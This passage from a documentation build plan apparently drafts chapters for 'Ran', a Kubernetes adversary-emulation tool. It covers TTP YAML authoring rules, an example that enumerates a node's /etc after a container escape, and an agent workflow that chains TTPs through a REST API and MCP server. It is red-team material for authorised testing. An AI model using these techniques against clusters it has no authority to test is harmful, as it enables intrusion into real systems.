relationships can be added to YAML files before the code lands).

```yaml
related:
  - kind: Pod
    accessLevel: user-exec
```
```

- [ ] **Step 3: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 4: Commit**

```bash
git add docs/book/src/reference/effects.md docs/book/src/reference/preconditions.md
git commit -m "docs(book): write effect catalog and precondition types reference chapters"
```

---

## Task 15: For Agents

**Files:**
- Write: `docs/book/src/agents/authoring.md`
- Write: `docs/book/src/agents/api-mcp.md`

- [ ] **Step 1: Write `docs/book/src/agents/authoring.md`**

````markdown
# Authoring TTPs as an Agent

This chapter provides the precise, unambiguous contract an AI agent needs to
produce valid, runnable Ran TTP YAML files.

## Validity rules

A YAML file is a valid Ran TTP if and only if:

1. It is valid YAML.
2. It contains a non-empty `name:` string at the top level.
3. Every declared parameter is referenced as `${PARAM_NAME}` in at least one
   procedure command, or explicitly documented as unused.
4. Every effect expression references a valid built-in effect (see [Effect Catalog](../reference/effects.md)).
5. Every precondition key is from the supported set (see [Precondition Types](../reference/preconditions.md)).

## Minimal runnable TTP

```yaml
name: My Custom Technique
tactic: Discovery
procedures:
  - key: shell
    command: id
```

## Required fields checklist

Before submitting a TTP YAML, verify:

- [ ] `name:` is present and non-empty
- [ ] `tactic:` matches a valid MITRE ATT&CK tactic or the TTP is placed in the
  correct subdirectory
- [ ] At least one entry in `procedures:` is non-empty
- [ ] Every `${PARAM}` placeholder in procedure commands has a corresponding entry
  in `parameters:` (or is a built-in variable: `${NS}`, `${TOKEN}`, `${API_SERVER}`,
  `${TARGET.IP}`, `${TARGET_ID}`, `${CMD}`)
- [ ] Every effect string is a known effect expression (see [Effect Catalog](../reference/effects.md))
- [ ] Every precondition key is from the supported set

## Parameter contract

```yaml
parameters:
  PARAM_NAME:
    type: string          # string | Namespace | ServiceAccount | bool | int
    description: "..."    # required: non-empty
    default: ""           # may use ${BUILT_IN_VAR} syntax
    required: false       # omit for required parameters
```

Parameter names are case-sensitive. Built-in variables (`${NS}`, `${TOKEN}`, etc.)
are always available — do not redeclare them unless overriding the default.

## Procedure contract

Every procedure must have at least one of:

- A non-empty `command:` string
- A non-null `k8s_request:` map
- A non-null `http_request:` map
- A non-empty `steps:` list

An empty procedure (all fields absent or empty) is silently dropped.

## Effect expression grammar

```
effect      := simple_effect | relation_effect
simple_effect  := effect_name                          # e.g. k8s.pod
relation_effect := effect_name "(" arg ("," arg)* ")"  # e.g. container.escape(sys)
arg         := entity_id | "sys" | wildcard
entity_id   := <any non-empty string>
wildcard    := "all(" kind ")"
```

The `sys` token resolves to the entity the TTP executed against (`TARGET_ID`).

## Common authoring mistakes

| Mistake | Fix |
|---|---|
| Using `${VAR}` without declaring the parameter | Declare the param or use a built-in variable |
| Declaring `rbac:` without any entries | Remove the key; empty `rbac: []` is treated as no restriction |
| Setting `accessLevel: root-exec` expecting root check | All declared `accessLevel` values (except `none`) resolve to the same `Exec` check |
| Using `container.escape(src, tgt)` with two args | `container.escape` takes exactly one arg (`sys` or a pod entity ID) |
| Effect `k8s.pod` without `Namespace` and `PodName` in context | Ensure those parameters exist and are populated at execution time |
| Setting `status: disabled` and expecting the TTP to appear in `ran armory` | Disabled TTPs are excluded from listings; use `draft` for in-progress work |

## Example: complete custom TTP

```yaml
name: Enumerate Node Filesystem via Escape
description: >
  After a container escape, enumerate the host node's /etc directory
  to identify sensitive files.
tactic: Discovery
techniques: ["T1083"]
preconditions:
  kind: Node
  accessLevel: user-exec
parameters:
  PATH:
    type: string
    description: Directory to enumerate
    default: /etc
procedures:
  - key: shell
    command: find ${PATH} -maxdepth 2 -type f 2>/dev/null
references:
  - https://attack.mitre.org/techniques/T1083/
```
````

- [ ] **Step 2: Before writing, verify actual API endpoints**

Read `crates/api/src/api_handlers.rs` and `crates/api/src/mcp.rs` to confirm which
endpoints and MCP tools actually exist. The content below reflects the intended
surface; adjust any endpoint paths, method signatures, or tool names to match
what the code exposes before writing the file.

Also check whether `ran export` is a real CLI subcommand (look in `crates/cli/src/`
or wherever subcommands are registered) — if not, describe export via the UI only.

- [ ] **Step 3: Write `docs/book/src/agents/api-mcp.md`**

```markdown
# Using Ran via API and MCP

Ran exposes its campaign state and invocation surface via a REST API and a Model
Context Protocol (MCP) server. This lets agents drive emulation sessions
programmatically without the web UI.

## REST API

When `ran emulate` is running, the API is available at `http://localhost:8080/api`
(port configurable with `--port`).

### Core endpoints

| Method | Path | Description |
|---|---|---|
| `GET` | `/api/ttps` | List all enabled TTPs with their metadata |
| `GET` | `/api/ttps/{id}` | Get a single TTP by ID |
| `GET` | `/api/campaign` | Get the current campaign state (entities and relations) |
| `GET` | `/api/campaign/entities` | List all entities in the knowledge graph |
| `GET` | `/api/campaign/applicable` | List TTPs applicable to the current target |
| `POST` | `/api/invoke` | Invoke a TTP |
| `GET` | `/api/events` | Server-sent event stream of campaign updates |

### Invoking a TTP via API

`POST /api/invoke` with a JSON body:

```json
{
  "ttpId": "get-serviceaccounts",
  "targetId": "pod/default/compromised-pod",
  "params": {
    "NS": "default",
    "ALL_NS": "false"
  },
  "procedureKey": "kubectl"
}
```

Response:

```json
{
  "executionId": "exec-42",
  "output": "...",
  "effects": [...],
  "newEntities": [...],
  "newRelations": [...]
}
```

### Reading campaign state

`GET /api/campaign` returns:

```json
{
  "entities": {
    "pod/default/nginx": { "kind": "Pod", "name": "nginx", "namespace": "default", ... },
    "sa/default/ci-deployer": { "kind": "ServiceAccount", ... }
  },
  "relations": [
    { "kind": "runs-on", "source": "pod/default/nginx", "target": "node/worker-1" }
  ]
}
```

## MCP server

Ran exposes a Model Context Protocol server that agents can connect to as a tool
provider. Start it alongside `ran emulate`:

```sh
ran emulate --mcp
```

The MCP server exposes the same operations as the REST API as callable tools.

### Available MCP tools

| Tool | Description |
|---|---|
| `list_ttps` | List all enabled TTPs, optionally filtered by tactic |
| `get_ttp` | Get full details for one TTP including parameters and procedures |
| `get_campaign_state` | Return the current knowledge graph |
| `get_applicable_ttps` | List TTPs applicable to a given target entity |
| `invoke_ttp` | Execute a TTP and return the output and graph updates |
| `list_entities` | List all entities of a given type |
| `get_entity` | Get full details for one entity by ID |

### Recommended agent workflow

1. Call `get_campaign_state` to understand the current foothold.
2. Select a target entity from `entities`.
3. Call `get_applicable_ttps` for that entity to see what's available.
4. Call `get_ttp` on candidates to read parameters and effects.
5. Call `invoke_ttp` with the chosen TTP and parameters.
6. Read the returned `newEntities` and `newRelations` to understand the graph update.
7. Repeat from step 2 using the newly discovered entities.

## Subscribing to campaign events

For real-time updates, consume the SSE stream:

```sh
curl -N http://localhost:8080/api/events
```

Each event is a JSON object with a `type` field:

| Event type | Description |
|---|---|
| `entity_added` | A new entity was added to the graph |
| `relation_added` | A new relation was added |
| `ttp_executed` | A TTP finished executing |
| `entity_updated` | An existing entity was updated |
```

- [ ] **Step 4: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 5: Commit**

```bash
git add docs/book/src/agents/
git commit -m "docs(book): write for-agents authoring and API/MCP chapters"
```

---

## Task 16: Final polish and gitignore

**Files:**
- Modify: `.gitignore` (already updated in Task 1; verify)
- Final `mdbook build`

- [ ] **Step 1: Verify .gitignore has book output excluded**

```bash
grep "docs/book/book" .gitignore
```

Expected: outputs the line `docs/book/book/`. If missing, add it.

- [ ] **Step 2: Run final full build**

```bash
mdbook build docs/book 2>&1
```

Expected: exits 0, zero warnings about missing files or broken links.

- [ ] **Step 3: Verify all SUMMARY.md entries have corresponding files**

```bash
cd docs/book && mdbook test 2>&1 | head -40
```

Expected: exits 0 or only reports "no Rust code blocks to test" (which is fine for
a docs-only book).

- [ ] **Step 4: Commit any remaining changes**

```bash
git add -A docs/book/ .gitignore
git commit -m "docs(book): final build verification and polish"
```
